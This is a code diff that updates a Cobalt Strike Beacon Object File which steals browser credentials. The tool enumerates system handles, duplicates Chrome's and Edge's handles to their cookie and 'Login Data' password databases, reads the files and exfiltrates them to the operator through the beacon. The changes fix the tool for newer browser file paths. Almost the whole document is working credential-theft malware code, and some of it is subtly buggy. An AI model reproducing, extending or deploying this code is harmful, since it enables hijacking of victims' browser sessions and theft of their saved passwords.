@@ -36,19 +36,21 @@ WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree (HGLOBAL hMem);
 WINBASEAPI HANDLE WINAPI  KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags,DWORD th32ProcessID);
 WINBASEAPI BOOL WINAPI    KERNEL32$Process32First(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
 WINBASEAPI BOOL WINAPI    KERNEL32$Process32Next(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
-WINBASEAPI HANDLE WINAPI  KERNEL32$GetCurrentProcess (VOID);
+// WINBASEAPI HANDLE WINAPI  KERNEL32$GetCurrentProcess (VOID);
+WINBASEAPI DWORD WINAPI KERNEL32$GetFileType(HANDLE hFile);
 WINBASEAPI BOOL WINAPI    KERNEL32$DuplicateHandle (HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwOptions);
 WINBASEAPI HANDLE WINAPI  KERNEL32$OpenProcess (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
 WINBASEAPI BOOL WINAPI    CRYPT32$CryptStringToBinaryA (LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE *pbBinary, DWORD *pcbBinary, DWORD *pdwSkip, DWORD *pdwFlags);
 WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);
 WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA (LPCSTR lpLibFileName);
 WINBASEAPI DWORD WINAPI   KERNEL32$SetFilePointer (HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
-WINBASEAPI VOID WINAPI    KERNEL32$SetLastError (DWORD dwErrCode);
+//WINBASEAPI VOID WINAPI    KERNEL32$SetLastError (DWORD dwErrCode);
 DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(int SystemInformationClass,PVOID SystemInformation,ULONG SystemInformationLength,PULONG ReturnLength);
 WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
 WINBASEAPI BOOL WINAPI KERNEL32$HeapFree (HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
 WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap (VOID);
 WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
+DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryObject(HANDLE, OBJECT_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
 #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
     FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
@@ -56,7 +58,10 @@ WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T
     FARPROC srand = Resolver("msvcrt", "srand");\
     FARPROC time = Resolver("msvcrt", "time");\
     FARPROC strnlen = Resolver("msvcrt", "strnlen");\
-    FARPROC rand = Resolver("msvcrt", "rand");
+    FARPROC rand = Resolver("msvcrt", "rand");\
+    FARPROC realloc = Resolver("msvcrt", "realloc");\
+    FARPROC malloc = Resolver("msvcrt", "malloc");\
+    FARPROC free = Resolver("msvcrt", "free");
 #define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
 #define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)
 #define DATA_FREE(d, l) \
@@ -354,12 +359,12 @@ VOID GetChromePID() {
                 //chrome was found, get cookies database
                 processCount++;
                 if (databaseStatus == FALSE){
-                    if (GetBrowserFile(pe32.th32ProcessID, "Cookies", "ChromeCookie.db")){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies\0", "ChromeCookie.db")){
                         databaseStatus = TRUE;
                     }
                 }
                 if (passwordStatus == FALSE){
-                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", "ChromePasswords.db")){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data\0", "ChromePasswords.db")){
                         passwordStatus = TRUE;
                     }
                 }
@@ -392,75 +397,102 @@ VOID GetChromePID() {
 }
 
 BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
+    IMPORT_RESOLVE;
     
     BeaconPrintf(CALLBACK_OUTPUT,"Browser PID found %d\n", PID);
     BeaconPrintf(CALLBACK_OUTPUT,"Searching for handle to %s \n", browserFile);
     
-    SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
     DWORD dwNeeded = 0;
     DWORD dwSize = 0xffffff / 2;
-    shi = (SYSTEM_HANDLE_INFORMATION *)KERNEL32$GlobalAlloc(GPTR, dwSize);
+    shi = (SYSTEM_HANDLE_INFORMATION_EX *)KERNEL32$GlobalAlloc(GPTR, dwSize);
     //utilize NtQueryStemInformation to list all handles on system
-    NTSTATUS status;
-    status = NTDLL$NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);
-
+    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status == STATUS_INFO_LENGTH_MISMATCH)
+    {
+        dwSize = dwNeeded;
+        shi = (SYSTEM_HANDLE_INFORMATION_EX*)realloc(shi, dwSize);
+        if (dwSize == NULL)
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Failed to reallocate memory for handle information.\n");
+            return FALSE;
+        }
+        
+    }
+    status = NTDLL$NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
+    if(status != 0)
+    {
+        BeaconPrintf(CALLBACK_ERROR,"NtQuerySystemInformation failed with status 0x%x.\n",status);
+        return FALSE;
+    }
     //BeaconPrintf(CALLBACK_OUTPUT,"Handle Count %d\n", shi->NumberOfHandles);
     DWORD i = 0;
     BOOL firstHandle = TRUE;
+    POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+
     //iterate through each handle and find our PID and a handle to a file
     for(i = 0; i < shi->NumberOfHandles; i++) {
-        //check if handle to file
-        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
-            //check if handle is to our PID
-            if(shi->Handles[i].ProcessId == PID) {
+        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
+        if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
+            //BeaconPrintf(CALLBACK_OUTPUT, "Found PID");
+            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
+            ULONG returnLength = 0;
+            NTSTATUS ret = 0;
+            if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
+            
+                HANDLE hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
+                if(hProc == INVALID_HANDLE_VALUE) {
+                    BeaconPrintf(CALLBACK_ERROR,"OpenProcess failed %d\n", KERNEL32$GetLastError());
+                    KERNEL32$GlobalFree(shi);
+                    return FALSE;
+                }
+
+                HANDLE hDuplicate = NULL;
+                if(!KERNEL32$DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE) -1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+                    //BeaconPrintf(CALLBACK_ERROR,"DuplicateHandle failed %d\n", KERNEL32$GetLastError());
+                    continue;                  
+                }
+                //Check if the handle exists on disk, otherwise the program will hang
+                DWORD fileType = KERNEL32$GetFileType(hDuplicate);
+                if (fileType != FILE_TYPE_DISK) {
+                    //BeaconPrintf(CALLBACK_ERROR, "NOT A FILE");
+                    continue;
+                }
+                //BeaconPrintf(CALLBACK_OUTPUT,"Duplicated Handle, confirmed file on disk");
+                ret = NTDLL$NtQueryObject(hDuplicate,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
                 
-                //BeaconPrintf(CALLBACK_OUTPUT,"PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
-                if(shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x2 && shi->Handles[i].GrantedAccess == 0x0012019f)) {
-                        HANDLE hProc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
-                        if(hProc == INVALID_HANDLE_VALUE) {
-                            BeaconPrintf(CALLBACK_ERROR,"OpenProcess failed %d\n", KERNEL32$GetLastError());
-                            KERNEL32$GlobalFree(shi);
-                            return FALSE;
-                        }
+                if (ret != 0)
+                {
+                    BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
+                    return FALSE;
+                    //ret = NTDLL$NtQueryObject(hDuplicate,ObjectNameInformation, objectNameInfo, returnLength, &returnLength);
+                }
+                if (ret == 0 && objectNameInfo->Name.Length > 0){
+                    //BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    char handleName[1024];
+                    sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
-                        HANDLE hDuplicate = NULL;
-                        if(!KERNEL32$DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, KERNEL32$GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
-                            BeaconPrintf(CALLBACK_ERROR,"DuplicateHandle failed %d\n", KERNEL32$GetLastError());
-                            KERNEL32$GlobalFree(shi);
-                            return FALSE;                   
-                        }
+                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
+                    ret = NTDLL$NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
+                    if (ret != 0)
+                    {
+                        BeaconPrintf(CALLBACK_ERROR,"Failed NtQueryObject");
+                        return FALSE;
+                        //ret = NTDLL$NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, returnLength, &returnLength);
+                    }
+                    if (ret == 0 && (MSVCRT$strcmp(objectTypeInfo,"File"))){
+                        //BeaconPrintf(CALLBACK_OUTPUT, "%s\n", handleName);
+                        //BeaconPrintf(CALLBACK_OUTPUT, "%d\n", MSVCRT$strlen(handleName));
+                        if (MSVCRT$strstr(handleName, browserFile) != NULL && (MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 4], "Data") == 0 || MSVCRT$strcmp(&handleName[MSVCRT$strlen(handleName) - 7], "Cookies") == 0)){
 
-                        //when file does not exist on disk, error 87 thrown
-                        if(KERNEL32$GetLastError() == 87) {
-                            KERNEL32$SetLastError(0);
-                            BeaconPrintf(CALLBACK_ERROR,"Wrong Function Call \n Skipping handle \n");
-                            //KERNEL32$GlobalFree(shi);
-                            continue;
-                        }
+                        //if (MSVCRT$strstr(handleName, browserFile) != NULL){
 
-                        FARPROC GetFinalPathNameByHandle = KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("kernel32.dll"), "GetFinalPathNameByHandleA");
-                        CHAR filename[256];
-                        MSVCRT$memset(filename,0, 256);
-                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
-                        //BeaconPrintf(CALLBACK_OUTPUT,"%s\n", filename);
+                            BeaconPrintf(CALLBACK_OUTPUT,"%s WAS FOUND\n", browserFile);
+                            BeaconPrintf(CALLBACK_OUTPUT, "Handle Name: %.*ws\n", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
-                        if(firstHandle) {
-                            DWORD dwFilenameSize = MSVCRT$strlen(filename);
-                            CHAR *newFilename = filename + MSVCRT$strlen(filename) - MSVCRT$strlen("Application");
-                            firstHandle = FALSE;
-
-                            if(MSVCRT$strcmp(newFilename, "Application") == 0) {
-                                BeaconPrintf(CALLBACK_ERROR,"SKIPPING PID %d\n", PID);
-                                KERNEL32$GlobalFree(shi);
-                                return FALSE;
-                            }
-                        }
-
-                        if(MSVCRT$strstr(filename, browserFile) != NULL) {
-                            //BeaconPrintf(CALLBACK_OUTPUT,"COOKIE WAS FOUND\n");
                             KERNEL32$SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                             DWORD dwFileSize = KERNEL32$GetFileSize(hDuplicate, NULL);
-                            //BeaconPrintf(CALLBACK_OUTPUT,"file size is %d\n", dwFileSize);
+                            BeaconPrintf(CALLBACK_OUTPUT,"file size is %d\n", dwFileSize);
                             DWORD dwRead = 0;
                             CHAR *buffer = (CHAR*)KERNEL32$GlobalAlloc(GPTR, dwFileSize);
                             KERNEL32$ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
@@ -468,10 +500,14 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName) {
                             download_file(downloadFileName,buffer, dwFileSize);
                             
                             KERNEL32$GlobalFree(buffer);
-                            return TRUE;
+                            continue;
                         }
-
+                        
+                    }else{
                         KERNEL32$CloseHandle(hDuplicate);
+                        free(objectTypeInfo);
+                        free(objectNameInfo);
+                    }
                 }
             }
         }
@@ -497,7 +533,7 @@ VOID GetEdgePID() {
                 //edge was found, get cookies database
                 processCount++;
                 if (databaseStatus == FALSE){
-                    if (GetBrowserFile(pe32.th32ProcessID, "Cookies", "EdgeCookie.db")){
+                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies", "EdgeCookie.db")){
                         databaseStatus = TRUE;
                     }
                 }
